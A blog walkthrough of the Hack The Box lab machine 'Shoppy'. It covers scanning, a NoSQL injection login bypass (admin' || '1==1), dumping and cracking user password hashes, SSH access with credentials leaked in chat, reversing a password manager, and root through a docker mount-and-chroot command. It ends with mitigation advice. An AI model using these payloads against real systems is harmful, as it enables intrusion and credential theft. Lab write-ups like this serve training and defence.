---
layout: post
title: Hack The Box Walkthrough - Shoppy
date: 2023-01-14
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2022/10/HTB/Shoppy
img: 2022/10/Shoppy/Shoppy.png
---

I had a hard time getting my initial access to this box. It required playing with Mongo Injection. And multiple enumerations of subdomains. Once on the box, getting root was quick. A reversing of a simple application and running Docker.

* Room: Shoppy
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Shoppy](https://app.hackthebox.com/machines/Shoppy)
* Author: [lockscan](https://app.hackthebox.com/users/217870)

## Enumeration

As always, I started the box by running rustscan to find open ports.

```bash
$ rustscan -a target -- -v | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.46.180:22
Open 10.129.46.180:80
Open 10.129.46.180:9093
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 06:11 EDT
Initiating Ping Scan at 06:11
Scanning 10.129.46.180 [2 ports]
Completed Ping Scan at 06:11, 0.03s elapsed (1 total hosts)
Initiating Connect Scan at 06:11
Scanning target (10.129.46.180) [3 ports]
Discovered open port 80/tcp on 10.129.46.180
Discovered open port 22/tcp on 10.129.46.180
Discovered open port 9093/tcp on 10.129.46.180
Completed Connect Scan at 06:11, 0.03s elapsed (3 total ports)
Nmap scan report for target (10.129.46.180)
Host is up, received syn-ack (0.028s latency).
Scanned at 2022-09-19 06:11:10 EDT for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
9093/tcp open  copycat syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
```

There were 3 open ports:
* 22 (SSH)
* 80 (HTTP)
* 9093 (?)

I checked what was on port 9093. I tried connecting to it with netcat, it had a web server on it.

```bash
$ nc target 9093

HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request%
```

I opened it in a browser and got some kind of garbage collector logs.

![Logs](/assets/images/2022/10/Shoppy/LogsSite.png "Logs")

I also scanned for UDP ports. None were open.

```bash
$ sudo nmap -sU target -oN nampUdp.txt
[sudo] password for ehogue:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 15:08 EDT
Nmap scan report for target (10.129.100.8)
Host is up (0.045s latency).
All 1000 scanned ports on target (10.129.100.8) are in ignored states.
Not shown: 951 closed udp ports (port-unreach), 49 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 997.63 seconds
```

## Main Site

I opened a browser to port 80 and I was redirected to `http://shoppy.htb`. I added that to my hosts files and reloaded the site.

![Main Site](/assets/images/2022/10/Shoppy/MainSite.png "Main site")

It was a simple page with a countdown for the launch of the site.

I launched feroxbuster to scan for hidden pages.

```bash
$ feroxbuster -u http://shoppy.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://shoppy.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       26l       62w     1074c http://shoppy.htb/login
302      GET        1l        4w       28c http://shoppy.htb/admin => /login
200      GET       57l      129w     2178c http://shoppy.htb/
301      GET       10l       16w      179c http://shoppy.htb/images => /images/
301      GET       10l       16w      171c http://shoppy.htb/js => /js/
301      GET       10l       16w      173c http://shoppy.htb/css => /css/
301      GET       10l       16w      179c http://shoppy.htb/assets => /assets/
302      GET        1l        4w       28c http://shoppy.htb/Admin => /login
200      GET       26l       62w     1074c http://shoppy.htb/Login
301      GET       10l       16w      187c http://shoppy.htb/assets/css => /assets/css/
301      GET       10l       16w      185c http://shoppy.htb/assets/js => /assets/js/
301      GET       10l       16w      187c http://shoppy.htb/assets/img => /assets/img/
301      GET       10l       16w      177c http://shoppy.htb/fonts => /fonts/
301      GET       10l       16w      191c http://shoppy.htb/assets/fonts => /assets/fonts/
301      GET       10l       16w      203c http://shoppy.htb/assets/img/avatars => /assets/img/avatars/
302      GET        1l        4w       28c http://shoppy.htb/ADMIN => /login
301      GET       10l       16w      181c http://shoppy.htb/exports => /exports/
301      GET       10l       16w      197c http://shoppy.htb/assets/img/dogs => /assets/img/dogs/
200      GET       26l       62w     1074c http://shoppy.htb/LogIn
200      GET       26l       62w     1074c http://shoppy.htb/LOGIN
301      GET       10l       16w      199c http://shoppy.htb/assets/bootstrap => /assets/bootstrap/
301      GET       10l       16w      207c http://shoppy.htb/assets/bootstrap/css => /assets/bootstrap/css/
301      GET       10l       16w      205c http://shoppy.htb/assets/bootstrap/js => /assets/bootstrap/js/
[####################] - 17m  1072496/1072496 0s      found:23      errors:13
[####################] - 15m    63088/63088   68/s    http://shoppy.htb
[####################] - 15m    63088/63088   68/s    http://shoppy.htb/
[####################] - 15m    63088/63088   68/s    http://shoppy.htb/images
[####################] - 15m    63088/63088   68/s    http://shoppy.htb/js
[####################] - 15m    63088/63088   68/s    http://shoppy.htb/css
[####################] - 15m    63088/63088   68/s    http://shoppy.htb/assets
[####################] - 15m    63088/63088   68/s    http://shoppy.htb/assets/css
[####################] - 15m    63088/63088   68/s    http://shoppy.htb/assets/js
[####################] - 15m    63088/63088   68/s    http://shoppy.htb/assets/img
[####################] - 15m    63088/63088   67/s    http://shoppy.htb/fonts
[####################] - 15m    63088/63088   68/s    http://shoppy.htb/assets/fonts
[####################] - 15m    63088/63088   68/s    http://shoppy.htb/assets/img/avatars
[####################] - 16m    63088/63088   63/s    http://shoppy.htb/exports
[####################] - 14m    63088/63088   72/s    http://shoppy.htb/assets/img/dogs
[####################] - 10m    63088/63088   98/s    http://shoppy.htb/assets/bootstrap
[####################] - 10m    63088/63088   98/s    http://shoppy.htb/assets/bootstrap/css
[####################] - 10m    63088/63088   98/s    http://shoppy.htb/assets/bootstrap/js
```

There was a login page on the site.

![Login](/assets/images/2022/10/Shoppy/ShoppyLogin.png "Login")

I started experimenting with the login page. The form post was sending URL encoded data, but I found out I could send JSON.

```http
POST /login HTTP/1.1
Host: shoppy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 45
Origin: http://shoppy.htb
Connection: close
Referer: http://shoppy.htb/login
Cookie: rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BqJZWhUg9rHPJESKYav%2BTYIw0yPamDLm1FVV%2F6zyigcmcZZZcT6%2Bdh; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX18s3Kpqv13Qh3uXi%2F%2BTC1wmF%2F0fD6vRkOSDJkA4IUAGThTOALuvYKFBzL8Fvm2%2FipaMY0JC3slMDQ%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19o9wvZuqv6DsPRAhV9vRUXTM8HAo6pqjw%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX19fWE8xwhkhWoweKa%2FWuKV%2Bt8u9%2F%2FUFCfA%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19Ti1qyYZZAQa2C%2Bu5qCnwv%2BXwPN5vEpKY%3D
Upgrade-Insecure-Requests: 1

{
	"username":"aaaa",
	"password":"aaa"
}
```

```http
HTTP/1.1 302 Found
Server: nginx/1.23.1
Date: Sun, 09 Oct 2022 21:20:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 102
Connection: close
Location: /login?error=WrongCredentials
Vary: Accept

<p>Found. Redirecting to <a href="/login?error=WrongCredentials">/login?error=WrongCredentials</a></p>
```

I tried SQL Injection and NoSQL Injection. The site seemed to crash when sending a single `'`. After trying lots of different payloads I found, I finally got one that worked.

```http
POST /login HTTP/1.1
Host: shoppy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 56
Origin: http://shoppy.htb
Connection: close
Referer: http://shoppy.htb/login
Cookie: rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BqJZWhUg9rHPJESKYav%2BTYIw0yPamDLm1FVV%2F6zyigcmcZZZcT6%2Bdh; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX18s3Kpqv13Qh3uXi%2F%2BTC1wmF%2F0fD6vRkOSDJkA4IUAGThTOALuvYKFBzL8Fvm2%2FipaMY0JC3slMDQ%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19o9wvZuqv6DsPRAhV9vRUXTM8HAo6pqjw%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX19fWE8xwhkhWoweKa%2FWuKV%2Bt8u9%2F%2FUFCfA%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19Ti1qyYZZAQa2C%2Bu5qCnwv%2BXwPN5vEpKY%3D
Upgrade-Insecure-Requests: 1

{
	"username":"admin' || '1==1",
	"password":"aaa"
}
```

```http
HTTP/1.1 302 Found
Server: nginx/1.23.1
Date: Sun, 09 Oct 2022 21:25:22 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
Location: /admin
Vary: Accept
Set-Cookie: connect.sid=s%3AmNKTxh7ftyqhqdj5A07TAa2X-KIG_5wR.yESFg91bOC3floCU0ms6KxxVpL8BBmtVTEweVGbmr0w; Path=/; HttpOnly

<p>Found. Redirecting to <a href="/admin">/admin</a></p>
```

I tried the same thing in my browser and I got the admin page.

![Admin](/assets/images/2022/10/Shoppy/Admin.png "Admin")

The site had a static product list. But it also allowed searching for users. I use the same injection than the login page. This gave me a button to download the results.

![Search Results](/assets/images/2022/10/Shoppy/SearchResult.png "Search Results")

I downloaded them, it gave me a JSON of the users.

```json
[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "23c6877d9e2b564ef8b32c3a23de27b2"
  },
  {
    "_id": "62db0e93d6d6a999a66ee67b",
    "username": "josh",
    "password": "6ebcea65320589ca4f2f1ce039975995"
  }
]
```

The JSON contained two hashes, so I used hashcat to crack them.

```bash
$ hashcat -a0 -m0 hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2873/5810 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

6ebcea65320589ca4f2f1ce039975995:REDACTED
Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hash.txt
Time.Started.....: Sun Oct  9 16:06:34 2022 (3 secs)
Time.Estimated...: Sun Oct  9 16:06:37 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4136.8 kH/s (0.20ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[21217365786d652121] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 51%

Started: Sun Oct  9 16:06:32 2022
Stopped: Sun Oct  9 16:06:39 2022
```

It cracked the password for josh. I tried those credentials in SSH, but it failed. 

At this point, I got stuck for a long time. I had checked for subdomains already and did not find any. Eventually, I checked the Hack The Box forum for a hint. Someone mentioned using different lists. So I tried again with other lists. One of them found something.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -t30 --hw 11 -H "Host:FUZZ.shoppy.htb" "http://shoppy.htb/"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shoppy.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000328256:   200        0 L      141 W      3122 Ch     "mattermost"
```

I added `mattermost.shoppy.htb` to my host file. And loaded the site. It gave me a login page.

![Mattermost](/assets/images/2022/10/Shoppy/MattermostLogin.png "Mattermost")

I tried josh's credentials and I was in the chat application. I looked around the channels and found one that contained credentials.

![Chat](/assets/images/2022/10/Shoppy/CredsInChat.png "Chat")

I used those credentials in SSH and I was in.

```bash
$ ssh jess@target
jess@target's password:

➜  Shoppy
$ ssh jaeger@target
jaeger@target's password:
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;

jaeger@shoppy:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  shoppy_start.sh  Templates  user.txt  Videos

jaeger@shoppy:~$ cat user.txt
REDACTED
```

## Lateral Movement

Once I had a connection, I looked at what the user could do.

```bash
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger:
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

I could execute a password manager as the user deploy.


```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
[sudo] password for jaeger: 
Welcome to Josh password manager!     
Please enter your master password: REDACTED
Access denied! This incident will be reported !
```

I ran the program, it required a password. I tried jaeger's password but it did not work.

I looked for strings in the binary. 

```bash
jaeger@shoppy:~$ strings /home/deploy/password-manager
/lib64/ld-linux-x86-64.so.2
__gmon_start__
_ITM_deregisterTMCloneTable                    
...
Welcome to Josh password manager!
Please enter your master password: 
Access granted! Here is creds !
cat /home/deploy/creds.txt
Access denied! This incident will be reported !
...
```

I tried reading `/home/deploy/creds.txt` but I was not allowed. 

I used `scp` to get the executable locally and used Ghidra to reverse it. I quickly found the code that checked for the password.

![Ghidra](/assets/images/2022/10/Shoppy/Ghidra.png "Ghidra")

I used the password I found in the code and I was able to `su` as deploy.

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: REDACTED
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: REDACTED

jaeger@shoppy:~$ su deploy
Password:
$
```

## Getting root

Once logged in as deploy, I looked for ways to get root. The user was not allowed to run anything with `sudo` and I did not find any suspicious suid binary.

But the user was part of the docker group. So they could run `docker`.

```bash
deploy@shoppy:/home/jaeger$ groups
deploy docker

deploy@shoppy:/home/jaeger$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   2 months ago   5.53MB

```

I knew I could easily get root access with docker. I when to [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell) for the command to mount `/` in a container.


```bash
deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# ls /root
root.txt

# cat /root/root.txt
REDACTED
```

## Mitigation

The first issue with this box was with the Mongo Injection. The code was using user input to build a string that it passed to `$where`.

 ```js
const query = { $where: `this.username === '${username}' && this.password === '${passToTest}'` };
```

It would have been safer to build the query without using `$where`. But this would still require that the data was validated to make sure only strings where used.

```js
const query = { username: `${username}`,  password: `${passToTest}` };
```

Next, the way passwords are used on the box is bad. Josh's password is reused between the main application and the chat server. Jaegear's credentials are sent over chat. And deploy's credentials are easy to get.

Finally, permissions to run `docker` should be restricted. On this box, deploy was allowed to do it, and their credentials were easy to get. That made getting root very easy.
